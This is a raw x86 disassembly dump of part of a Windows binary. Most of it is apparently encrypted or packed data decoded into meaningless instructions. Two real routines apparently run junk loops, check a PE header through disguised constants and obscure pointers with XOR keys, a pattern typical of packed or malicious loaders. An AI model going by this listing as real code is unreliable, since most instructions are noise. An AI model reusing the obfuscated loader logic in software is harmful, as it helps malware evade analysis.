  4101d9:	mov    cl,BYTE PTR [eax+ebx*4+0x2cd0f09a]
  4101e0:	(bad)  
  4101e2:	cmc    
  4101e3:	jg     0x41025d
  4101e5:	cmp    ah,BYTE PTR ds:0xf4596653
  4101eb:	jg     0x4101b7
  4101ed:	loope  0x410196
  4101ef:	fisubr WORD PTR [ecx-0x6e]
  4101f2:	and    eax,0xc8f89f7a
  4101f7:	rcl    ecx,1
  4101f9:	out    0x87,eax
  4101fb:	mov    DWORD PTR [ebx-0x44],edi
  4101fe:	push   ss
  4101ff:	js     0x4101f5
  410201:	add    al,0xd2
  410203:	aam    0x4a
  410205:	mov    ?,WORD PTR [ecx-0x62]
  410208:	mul    DWORD PTR [esi]
  41020a:	scas   al,BYTE PTR es:[edi]
  41020b:	mov    edx,0x5952236c
  410210:	sti    
  410211:	dec    esi
  410212:	push   es
  410213:	divps  xmm4,XMMWORD PTR [esi-0x15]
  410217:	cdq    
  410218:	mov    ch,0x94
  41021a:	push   ss
  41021b:	popf   
  41021c:	or     eax,0xb4be80db
  410221:	out    dx,al
  410222:	out    0x3,eax
  410224:	mov    eax,ds:0x4de26a98
  410229:	mov    esi,?
  41022b:	push   edi
  41022c:	push   eax
  41022d:	fstp   DWORD PTR [edi]
  41022f:	inc    eax
  410230:	lods   eax,DWORD PTR ds:[esi]
  410231:	fild   WORD PTR [ecx]
  410233:	push   ecx
  410234:	inc    ebp
  410235:	aaa    
  410236:	je     0x410225
  410238:	pop    ss
  410239:	xchg   esp,eax
  41023a:	fisubr WORD PTR [edi+0x34]
  41023d:	or     BYTE PTR [ecx-0x58d327cc],dh
  410243:	idiv   BYTE PTR [eax]
  410245:	pop    edi
  410246:	sbb    eax,0xf6b045eb
  41024b:	jno    0x410215
  41024d:	imul   eax,esp,0xfce33fdf
  410253:	add    ebx,DWORD PTR [ebx-0x57]
  410256:	push   0x54
  410258:	add    DWORD PTR [ecx],esp
  41025a:	call   0x3ec794c9
  41025f:	push   esp
  410260:	inc    eax
  410261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410262:	data16 sbb bl,BYTE PTR [ebx-0x6b]
  410266:	cmp    BYTE PTR [edx+0x1a],bh
  410269:	repz (bad) 
  41026b:	dec    ebx
  41026c:	sbb    al,0x2b
  41026e:	stos   DWORD PTR es:[edi],eax
  41026f:	jmp    0xf150:0xc7cfebce
  410276:	xchg   ecx,eax
  410277:	mov    ebx,0x62d85e6d
  41027c:	mov    bl,0xcb
  41027e:	pop    es
  41027f:	stc    
  410280:	inc    BYTE PTR [ecx+0x45]
  410283:	or     DWORD PTR [edi-0x4a],0x3de05bc3
  41028a:	adc    BYTE PTR [ebp+0x3e],ch
  41028d:	call   esp
  41028f:	or     esi,edx
  410291:	mov    eax,ds:0x1321accb
  410296:	ja     0x410284
  410298:	and    BYTE PTR [ebx-0xe2be673],0x8
  41029f:	adc    eax,0x5c137a46
  4102a4:	sub    al,0x55
  4102a6:	hlt    
  4102a7:	ss stos BYTE PTR es:[edi],al
  4102a9:	inc    esp
  4102aa:	ja     0x410268
  4102ac:	and    BYTE PTR [ebp-0x4c],dl
  4102af:	cmp    al,0xcf
  4102b1:	dec    esi
  4102b2:	sub    al,0xd9
  4102b4:	js     0x4102cd
  4102b6:	add    esp,esp
  4102b8:	jb     0x410251
  4102ba:	or     eax,0x2fc3aaeb
  4102bf:	sub    ch,dh
  4102c1:	cdq    
  4102c2:	or     DWORD PTR [ecx-0x75],ebx
  4102c5:	int3   
  4102c6:	loope  0x4102ae
  4102c8:	mov    dl,0x2
  4102ca:	mov    cl,0xe2
  4102cc:	lds    esp,FWORD PTR [eax+ebx*4-0x79]
  4102d0:	out    0x9e,al
  4102d2:	mov    DWORD PTR [edx],edi
  4102d4:	outs   dx,BYTE PTR es:[esi]
  4102d6:	or     esp,DWORD PTR [edx+ebx*8]
  4102d9:	add    eax,0x35add892
  4102de:	out    0xb7,eax
  4102e0:	jge    0x4102ec
  4102e2:	jae    0x410264
  4102e4:	lock or DWORD PTR [eax+0x4a1cb484],ebp
  4102eb:	mov    bh,0xc
  4102ee:	lea    eax,[edi-0x1e5d4ff4]
  4102f4:	lds    ebp,FWORD PTR [esi]
  4102f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102f8:	inc    esp
  4102f9:	stc    
  4102fa:	pop    esi
  4102fb:	adc    DWORD PTR [esi+eiz*4+0x7e],ecx
  4102ff:	jnp    0x4102df
  410301:	mov    eax,0x5d190c9c
  410306:	dec    esi
  410307:	mov    BYTE PTR ds:0xa953a818,dl
  41030d:	inc    ebx
  41030e:	sub    al,0x57
  410310:	mov    esp,0xbf063425
  410315:	or     edi,0x55
  410318:	inc    ebp
  410319:	sbb    bh,BYTE PTR [edi-0x3d]
  41031c:	mov    cl,0x88
  41031e:	rol    BYTE PTR [edx-0x3735434],cl
  410324:	jle    0x41032a
  410326:	pop    es
  410327:	test   eax,0xb7c362fa
  41032c:	push   es
  41032d:	push   ds
  41032e:	out    dx,al
  41032f:	cdq    
  410330:	rol    cl,cl
  410332:	lods   eax,DWORD PTR ds:[esi]
  410333:	sub    ch,ah
  410335:	fist   WORD PTR ds:0x4bca00d8
  41033b:	xchg   DWORD PTR [edi+0x7c],edx
  41033e:	jle    0x41034b
  410340:	sub    eax,0x7bc65f89
  410345:	mov    bl,BYTE PTR [ebp+0x7a46bd9f]
  41034b:	and    BYTE PTR [esi+0x5],0x67
  41034f:	dec    eax
  410350:	pop    ebx
  410351:	add    eax,0x91768a4b
  410356:	retf   0x5c7c
  410359:	hlt    
  41035a:	add    al,0x2
  41035c:	stos   BYTE PTR es:[edi],al
  41035d:	lods   eax,DWORD PTR ds:[esi]
  41035e:	(bad)  
  41035f:	or     ebx,DWORD PTR [esi+ecx*1]
  410362:	xchg   ebp,eax
  410363:	ja     0x41033e
  410365:	out    0x36,al
  410367:	pop    esi
  410368:	xchg   ecx,eax
  410369:	sbb    BYTE PTR [ecx+0x736d193],al
  41036f:	mov    WORD PTR [edx],ds
  410371:	jae    0x41030e
  410373:	dec    eax
  410374:	mov    dl,0x53
  410376:	mov    cl,0xb8
  410378:	add    al,0xef
  41037a:	jp     0x41033e
  41037c:	push   0xffffffa0
  41037e:	test   BYTE PTR [eax+0xb],dl
  410381:	mov    ah,0x6c
  410383:	gs scas eax,DWORD PTR es:[edi]
  410385:	outs   dx,DWORD PTR ds:[esi]
  410386:	ja     0x410339
  410388:	dec    esi
  410389:	stos   BYTE PTR es:[edi],al
  41038a:	mov    dl,0x5a
  41038c:	add    ch,BYTE PTR [ecx+0x6a57ae96]
  410392:	xchg   edx,eax
  410393:	cdq    
  410394:	(bad)  
  410395:	jmp    0x4103d0
  410397:	test   dh,bl
  410399:	push   0xffffffa6
  41039b:	push   ebp
  41039c:	pop    esp
  41039d:	mov    ds:0xd9a29429,al
  4103a2:	rcr    BYTE PTR [ebp-0x6f366163],1
  4103a8:	xor    BYTE PTR [ecx-0x5e],ch
  4103ab:	dec    edx
  4103ac:	xor    BYTE PTR ds:0xa3e426bf,al
  4103b2:	out    dx,al
  4103b3:	dec    esi
  4103b4:	pop    ecx
  4103b5:	xor    al,0xcc
  4103b7:	ds sbb al,0xea
  4103ba:	inc    ecx
  4103bb:	fdiv   DWORD PTR [edi+0x30]
  4103be:	jae    0x41042b
  4103c0:	pop    es
  4103c1:	(bad)  
  4103c3:	jmp    0xd531:0xbec72dc2
  4103ca:	mul    DWORD PTR [esi+0x325c120d]
  4103d0:	xchg   DWORD PTR [ecx+0x205382ef],esp
  4103d6:	or     DWORD PTR [ecx],0xe93ff67f
  4103dc:	inc    ebx
  4103dd:	(bad)  
  4103de:	pop    ecx
  4103df:	mov    ?,esp
  4103e1:	call   0xe327:0x7ecd0f86
  4103e8:	xlat   BYTE PTR ds:[ebx]
  4103e9:	push   ebp
  4103ea:	xlat   BYTE PTR ds:[ebx]
  4103eb:	repnz sub esi,DWORD PTR fs:[esp+edi*1+0x6cdc927]
  4103f4:	mul    edx
  4103f6:	inc    edi
  4103f7:	out    0x18,al
  4103f9:	sub    DWORD PTR [ebx+ecx*2],ecx
  4103fc:	daa    
  4103fd:	dec    esp
  4103fe:	adc    DWORD PTR [ebp-0x1a980dba],ecx
  410404:	and    edi,esp
  410406:	pop    ecx
  410407:	(bad)  
  410408:	fisubr WORD PTR [esi]
  41040a:	clc    
  41040b:	shr    DWORD PTR [esi+0x153944de],cl
  410411:	dec    ecx
  410412:	or     al,0xb0
  410414:	out    0xf4,eax
  410416:	fdiv   QWORD PTR ds:0xeb6e2a3b
  41041c:	xchg   bh,ch
  41041e:	mov    ch,0x77
  410420:	leave  
  410421:	mov    ecx,ebx
  410423:	lock loope 0x4103b0
  410426:	pop    edi
  410427:	js     0x410417
  410429:	in     al,dx
  41042a:	in     al,dx
  41042b:	inc    esi
  41042c:	xor    al,0x42
  41042e:	jno    0x41044c
  410430:	xlat   BYTE PTR ds:[ebx]
  410431:	adc    BYTE PTR [esi-0x53b01fbf],bl
  410437:	daa    
  410438:	in     al,0x5f
  41043a:	test   dh,ah
  41043c:	push   0xffffff8d
  41043e:	or     cl,BYTE PTR [ebp+0x3d]
  410441:	jne    0x410420
  410443:	add    cl,0x9e
  410446:	cmp    BYTE PTR ds:[ebp+0x22bcc2ec],0xbc
  41044e:	(bad)  
  41044f:	cld    
  410450:	in     al,dx
  410451:	pop    ss
  410452:	mov    dh,0x2a
  410454:	mov    dl,0x74
  410456:	call   0xbdfa7018
  41045b:	shr    BYTE PTR [ebp-0x7b],0x6d
  41045f:	icebp  
  410460:	pop    esi
  410461:	clc    
  410462:	sub    eax,0xc60b0f8d
  410467:	cmp    eax,0x191df981
  41046c:	pop    eax
  41046d:	cmp    BYTE PTR [ecx+eax*8+0x44],ch
  410471:	retf   0x68a0
  410474:	jmp    0x6ebd28d
  410479:	ret    0xf45
  41047c:	clc    
  41047d:	or     al,0x5a
  41047f:	adc    ecx,esp
  410481:	into   
  410482:	inc    edx
  410483:	mov    edx,0x818b8a7a
  410488:	xchg   esi,eax
  410489:	cmp    bl,BYTE PTR [eax+eax*8]
  41048c:	jne    0x4104fa
  41048e:	pop    ebp
  41048f:	nop
  410490:	jb     0x41044b
  410492:	xchg   ecx,eax
  410493:	fnstsw WORD PTR [esi+esi*4]
  410496:	lahf   
  410497:	cmp    ch,BYTE PTR [edx]
  410499:	mov    esi,0x94f4ab08
  41049e:	mov    bh,0xf6
  4104a0:	adc    DWORD PTR ds:0x23ac028b,esi
  4104a6:	loop   0x410485
  4104a8:	aam    0xd5
  4104aa:	jl     0x410497
  4104ac:	mov    esp,0xa02b3de3
  4104b1:	(bad)  
  4104b2:	(bad)  
  4104b3:	or     edi,DWORD PTR [eax]
  4104b5:	jl     0x410506
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x4344f7,0x1f
  4104d3:	cmp    DWORD PTR ds:0x4344f7,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x4344f7,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x4344f7,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x4344f7
  410508:	dec    eax
  410509:	mov    ds:0x4344f7,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x4344f7
  410516:	dec    eax
  410517:	mov    ds:0x4344f7,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x434547,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43458f,0x434613
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x43454f,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434587
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x4344eb,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x4344eb
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x4344eb,edx
  410571:	cmp    DWORD PTR ds:0x4344eb,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x4344eb,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x4344eb,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x4344eb
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x4344eb,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	punpckhdq mm3,mm0
  4105ef:	pop    edx
  4105f0:	test   BYTE PTR [edi+0x7e],0x7e
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x410591
  4105f9:	xor    ch,ch
  4105fb:	enter  0xce98,0x44
  4105ff:	scas   eax,DWORD PTR es:[edi]
  410600:	pop    ds
  410601:	fcom   DWORD PTR [edx+0x40]
  410604:	into   
  410605:	mov    bl,BYTE PTR ds:[ebx+ecx*1-0xbbcfc41]
  41060d:	repnz outs dx,DWORD PTR ds:[esi]
  41060f:	xor    eax,0xea7f10fb
  410614:	add    eax,DWORD PTR [ecx-0x64]
  410617:	fisub  WORD PTR ds:0x78acfe3
  41061d:	lea    esp,[edx]
  41061f:	mov    ecx,0xfc0d785d
  410624:	ja     0x410633
  410626:	imul   esp,DWORD PTR [ebx-0x7c],0xc23c0719
  41062d:	retf   
  41062e:	dec    esp
  41062f:	repnz push es
  410631:	adc    al,0x30
  410633:	jle    0x41069b
  410635:	pushw  es
  410637:	retf   
  410638:	fsincos 
  41063a:	jno    0x4106ac
  41063c:	sbb    al,0x1b
  41063e:	adc    esi,DWORD PTR [ebp+0x57]
  410641:	pop    es
  410642:	mov    ecx,0xe96eae0b
  410647:	ins    DWORD PTR es:[edi],dx
  410648:	(bad)  
  410649:	scas   al,BYTE PTR es:[edi]
  41064a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41064b:	icebp  
  41064c:	push   es
  41064d:	inc    edx
  41064e:	call   0x9ac2dbf8
  410653:	inc    esi
  410654:	rcr    cl,0xb0
  410657:	cld    
  410658:	test   eax,0xc24a955c
  41065d:	aad    0x2d
  41065f:	imul   edx,DWORD PTR [edx+0x69],0x6be9d5df
  410666:	sbb    eax,0x3874a739
  41066b:	aad    0x2b
  41066d:	loopne 0x41065c
  41066f:	dec    ebp
  410670:	ret    0xe3bc
  410673:	jb     0x4106d2
  410675:	(bad)  
  410676:	addr16 fucomip st,st(7)
  410679:	jge    0x4106d2
  41067b:	stos   BYTE PTR es:[edi],al
  41067c:	cmc    
  41067d:	js     0x4106d7
  41067f:	dec    eax
  410680:	int3   
  410681:	sahf   
  410682:	push   ds
  410683:	pop    es
  410684:	shr    BYTE PTR [eax],0xca
  410687:	scas   al,BYTE PTR es:[edi]
  410688:	push   cs
  410689:	std    
  41068a:	rol    DWORD PTR [ebp+0x62],cl
  41068d:	jp     0x4106b9
  41068f:	sub    ch,BYTE PTR [edx+0x28]
  410692:	cmc    
  410693:	call   0x90aa:0xd62e5e69
  41069a:	rol    esi,0x4e
  41069d:	inc    edi
  41069e:	dec    eax
  41069f:	add    eax,0xbe392d1e
  4106a4:	pop    eax
  4106a5:	imul   esp,ecx,0xffffffda
  4106a8:	xor    BYTE PTR [ebx],dl
  4106aa:	inc    eax
  4106ab:	sahf   
  4106ac:	out    0xfb,al
  4106ae:	mov    bl,BYTE PTR [esi]
  4106b0:	or     DWORD PTR [ebx],esi
  4106b2:	(bad)  
  4106b3:	test   BYTE PTR [esi],0x41
  4106b6:	mov    ?,WORD PTR [edx]
  4106b8:	cmp    eax,0x1b835856
  4106bd:	jmp    0x4092b341
  4106c2:	std    
  4106c3:	jl     0x41073a
  4106c5:	(bad)  
  4106c6:	stos   BYTE PTR es:[edi],al
  4106c7:	lock pop WORD PTR [ebx-0x2d]
  4106cc:	sti    
  4106cd:	aaa    
  4106ce:	rol    DWORD PTR [ebp+0x3270f3e0],cl
  4106d4:	jo     0x410730
  4106d6:	stc    
  4106d7:	lods   eax,DWORD PTR ds:[esi]
  4106d8:	fldenv [ecx+0x6da969]
  4106de:	add    DWORD PTR [ecx],0x44249eec
  4106e4:	push   edi
  4106e5:	repnz outs dx,BYTE PTR ds:[esi]
  4106e7:	sahf   
  4106e8:	stos   BYTE PTR es:[edi],al
  4106e9:	or     ecx,DWORD PTR [ebp+0x6a4f969]
  4106ef:	mov    BYTE PTR [edx+0x73],ch
  4106f2:	stos   DWORD PTR es:[edi],eax
  4106f3:	cmp    al,0x23
  4106f5:	out    dx,eax
  4106f6:	jle    0x4106e1
  4106f8:	repnz and eax,0x48a9986e
  4106fe:	lahf   
  4106ff:	xchg   esp,eax
  410700:	loopne 0x4106ba
  410702:	push   0xffffff9f
  410704:	les    ebx,FWORD PTR [edx-0x30170a79]
  41070a:	mov    WORD PTR [ebx-0x1b5fe22f],es
  410710:	fcom   QWORD PTR [edx-0x3f4e7b72]
  410716:	sbb    cl,BYTE PTR [esi+edx*8+0x1e]
  41071a:	xchg   edx,eax
  41071b:	cdq    
  41071c:	out    dx,eax
  41071d:	push   ds
  41071e:	xchg   ecx,eax
  41071f:	popa   
  410720:	dec    ecx
  410721:	aas    
  410722:	in     eax,dx
  410723:	pop    edi
  410724:	jmp    DWORD PTR [ebp-0x6e]
  410727:	inc    edi
  410728:	not    BYTE PTR [esi+0x620f981f]
  41072e:	or     edi,0xffffffbb
  410731:	sub    edi,DWORD PTR [ebx-0x51e2e24b]
  410737:	jns    0x4107a1
  410739:	cld    
  41073a:	jecxz  0x410760
  41073c:	test   eax,0x2e384f01
  410741:	lods   eax,DWORD PTR ds:[esi]
  410742:	or     bl,cl
  410744:	adc    al,0x81
  410746:	sahf   
  410747:	or     edx,DWORD PTR [edi-0x2f]
  41074a:	add    DWORD PTR [esi*4+0x60e5db5c],esi
  410751:	es in  eax,dx
  410753:	out    0xf3,al
  410755:	retf   0xa449
  410758:	lods   al,BYTE PTR ds:[esi]
  410759:	(bad)  
  41075a:	jmp    0x94e4:0x512ba394
  410761:	icebp  
  410762:	push   esi
  410763:	inc    BYTE PTR [ebp+0x8dc7fa4]
  410769:	and    dh,BYTE PTR [ebp-0x452753b5]
  41076f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410770:	pop    esi
  410771:	push   cs
  410772:	inc    esp
  410773:	retf   
  410774:	cmp    dl,BYTE PTR [eax+0x6e448ee3]
  41077a:	ror    DWORD PTR [esi+edi*2+0x7d],1
  41077e:	clc    
  41077f:	sub    eax,0x6bc95ba7
  410784:	and    DWORD PTR [ebx],edx
  410786:	adc    eax,0x5f925f32
  41078b:	or     al,0x6
  41078d:	neg    cl
  41078f:	push   DWORD PTR [ebp-0x3ae15856]
  410795:	mov    esi,DWORD PTR ds:[ebp+0x8]
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	xchg   DWORD PTR ds:0x411417e2,edi
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x41082a
  4107bc:	inc    ebx
  4107bd:	pop    eax
  4107be:	out    0x37,al
  4107c0:	cmp    dl,BYTE PTR [ebp-0x54a7ef0e]
  4107c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107c7:	enter  0x3144,0x4
  4107cb:	cmp    al,0xeb
  4107cd:	push   ss
  4107ce:	mov    esp,0xb92257f7
  4107d3:	sub    DWORD PTR [eax],ebp
  4107d5:	cmp    ch,BYTE PTR [edi-0x28c33a95]
  4107db:	cmp    al,0x43
  4107dd:	jle    0x41078a
  4107df:	mov    edi,0xb8b164b1
  4107e4:	push   ebx
  4107e5:	sar    DWORD PTR [esi+0x78],0x4
  4107e9:	cmp    eax,0x3826e73c
  4107ee:	sbb    BYTE PTR [ebx],ah
  4107f0:	and    DWORD PTR ds:0x5f97305b,0x49
  4107f7:	mov    al,0x24
  4107f9:	in     al,0xc8
  4107fb:	cmp    BYTE PTR [edi+0x18d3831d],ah
  410801:	rol    BYTE PTR [ecx+0x12],1
  410804:	pop    edi
  410805:	xchg   edx,eax
  410806:	dec    edx
  410807:	mul    DWORD PTR [edx]
  410809:	xor    al,0x74
  41080b:	(bad)  
  41080d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41080e:	test   eax,0x9a52bd59
  410813:	cmp    eax,0xacb1f905
  410818:	jge    0x410879
  41081a:	jb     0x410882
  41081c:	lods   eax,DWORD PTR ds:[esi]
  41081d:	mov    eax,0xb82a5361
  410822:	les    edi,FWORD PTR [eax]
  410824:	fisubr WORD PTR [edx]
  410826:	and    al,0xa6
  410828:	mov    DWORD PTR [eax-0x359efc05],esi
  41082e:	sub    dl,dh
  410830:	push   es
  410831:	ins    BYTE PTR es:[edi],dx
  410832:	jnp    0x41085c
  410834:	pusha  
  410835:	pop    edx
  410836:	je     0x410816
  410838:	xor    BYTE PTR [ebx],al
  41083a:	pop    esi
  41083b:	rcl    DWORD PTR [edi],cl
  41083d:	sbb    dh,ah
  41083f:	push   ds
  410840:	or     cl,BYTE PTR [ebp+0x2543adda]
  410846:	retf   0xb6d4
  410849:	cdq    
  41084a:	ins    BYTE PTR es:[edi],dx
  41084b:	jb     0x4108bc
  41084d:	adc    BYTE PTR [ebx+0x53c0f482],al
  410853:	ds je  0x41080e
  410856:	ds push ds
  410858:	daa    
  410859:	dec    eax
  41085a:	or     WORD PTR [esi+edx*8],dx
  41085e:	jmp    0xf17c:0x23b61a4a
  410865:	mov    dl,0x28
  410867:	call   0x644a4e29
  41086c:	and    BYTE PTR [eax],dl
  41086e:	ins    BYTE PTR es:[edi],dx
  41086f:	cmc    
  410870:	test   al,0xff
  410872:	imul   ecx,DWORD PTR [ebx],0x682f3211
  410878:	adc    al,0x3d
  41087a:	xor    eax,0xb2d6ff3e
  41087f:	pop    ss
  410880:	push   eax
  410881:	cmp    eax,ecx
  410883:	in     al,dx
  410884:	cmp    BYTE PTR [edx+0x2d],0xe9
  410888:	mov    ecx,0x1f2b213f
  41088d:	sub    eax,0xb71f7034
  410892:	mov    ah,0x9d
  410894:	lds    ebp,FWORD PTR [edx+0x12]
  410897:	mov    ds:0xe5959882,eax
  41089c:	or     bh,BYTE PTR [ebx+0x22]
  41089f:	test   al,0x6d
  4108a1:	inc    edx
  4108a2:	sub    al,0x1
  4108a4:	cdq    
  4108a5:	jg     0x4108a6
  4108a7:	or     al,0x24
  4108a9:	fdiv   QWORD PTR [esi]
  4108ab:	xor    dl,ch
  4108ad:	shl    ecx,0x87
  4108b0:	outs   dx,DWORD PTR ds:[esi]
  4108b1:	(bad)  
  4108b2:	fs retf 
  4108b4:	adc    BYTE PTR [ebx-0x2a54a52b],dh
  4108ba:	imul   ecx,DWORD PTR [esi+0x27],0x6ed1a47c
  4108c1:	fld    TBYTE PTR ds:0x7ceffeaf
  4108c7:	out    0x24,eax
  4108c9:	addr16 sahf 
  4108cb:	(bad)  
  4108cc:	and    al,0x1c
  4108ce:	jp     0x4108c8
  4108d0:	sub    eax,0x9fe894cf
  4108d5:	jb     0x410933
  4108d7:	and    ebx,DWORD PTR [edx]
  4108d9:	pushf  
  4108da:	or     bh,ah
  4108dc:	addr16 call 0x8a7b:0x2df78014
  4108e4:	xor    DWORD PTR [ecx+0x3c],ebx
  4108e7:	jge    0x4108e5
  4108e9:	or     eax,DWORD PTR [edi-0x7a]
  4108ec:	or     al,0x22
  4108ee:	jne    0x4108f1
  4108f0:	daa    
  4108f1:	or     BYTE PTR [eax-0x4b7656fd],ah
  4108f7:	mov    dl,0xdb
  4108f9:	or     BYTE PTR [ecx],0xb5
  4108fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108fd:	jae    0x4108ee
  4108ff:	pop    ebx
  410900:	sbb    ebx,DWORD PTR [eax-0x56efc1ec]
  410906:	mov    dl,0x2f
  410908:	mov    esi,0x75b0caa5
  41090d:	cld    
  41090e:	xchg   edx,eax
  41090f:	ret    
  410910:	xor    edx,ebx
  410912:	call   0x84bc8374
  410917:	arpl   WORD PTR [edx+ecx*4-0x16],bp
  41091b:	psrad  mm1,mm3
  41091e:	fdivr  DWORD PTR [eax-0x7831c224]
  410924:	push   0x71
  410926:	jbe    0x4108da
  410928:	pop    esi
  410929:	call   0x76518d42
  41092e:	(bad)  
  41092f:	lods   al,BYTE PTR ds:[esi]
  410930:	jg     0x410962
  410932:	add    eax,0xf70d3d41
  410937:	clc    
  410938:	sbb    DWORD PTR [esi+0x2e],ebx
  41093b:	cli    
  41093c:	imul   edx,DWORD PTR [edx],0x8e4a5cb9
  410942:	loope  0x41097a
  410944:	adc    eax,0xe1194fd5
  410949:	xlat   BYTE PTR ds:[ebx]
  41094a:	es int3 
  41094c:	pop    edi
  41094d:	mov    dh,0x55
  41094f:	pop    edi
  410950:	gs jmp 0xe6862f38
  410956:	jle    0x410990
  410958:	dec    ecx
  410959:	add    eax,ecx
  41095b:	cmp    DWORD PTR [esi+0x54],eax
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x4344ef,0x0
  41099b:	mov    eax,ds:0x4344ef
  4109a0:	inc    eax
  4109a1:	mov    ds:0x4344ef,eax
  4109a6:	cmp    DWORD PTR ds:0x4344ef,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x4344ef,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x4344ef
  4109db:	inc    eax
  4109dc:	mov    ds:0x4344ef,eax
  4109e1:	cmp    DWORD PTR ds:0x4344ef,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x4345cf
  4109f5:	adc    DWORD PTR ds:0x4344e3,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x4345bb,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434507,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	leave  
  410a2e:	lods   eax,DWORD PTR ds:[esi]
  410a2f:	sub    BYTE PTR [edi],0xaa
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x410a19
  410a3a:	mov    ch,0x4f
  410a3c:	cmp    eax,0x2b293473
  410a41:	xchg   esp,eax
  410a42:	mov    bh,0xd2
  410a44:	or     al,0xe2
  410a46:	and    al,0xa8
  410a48:	pop    es
  410a49:	mov    ebx,0x8ac2750e
  410a4e:	sub    edi,ebp
  410a50:	push   ebx
  410a51:	ins    BYTE PTR es:[edi],dx
  410a52:	or     ecx,edi
  410a54:	push   cs
  410a55:	mov    ebp,0x464f7142
  410a5a:	inc    ebp
  410a5b:	inc    edx
  410a5c:	arpl   si,sp
  410a5e:	jae    0x410a4b
  410a60:	dec    edi
  410a61:	xchg   esp,eax
  410a62:	sbb    al,0x72
  410a64:	rcl    ebx,0x4d
  410a67:	mov    dl,BYTE PTR [edi+0x99c0ff5]
  410a6d:	pop    edx
  410a6e:	mov    esp,0x82825d51
  410a73:	imul   BYTE PTR [edx]
  410a75:	mov    ah,0x19
  410a77:	pop    eax
  410a78:	mov    bh,0xc
  410a7a:	imul   ebp,esp,0x7d9ba20d
  410a80:	scas   al,BYTE PTR es:[edi]
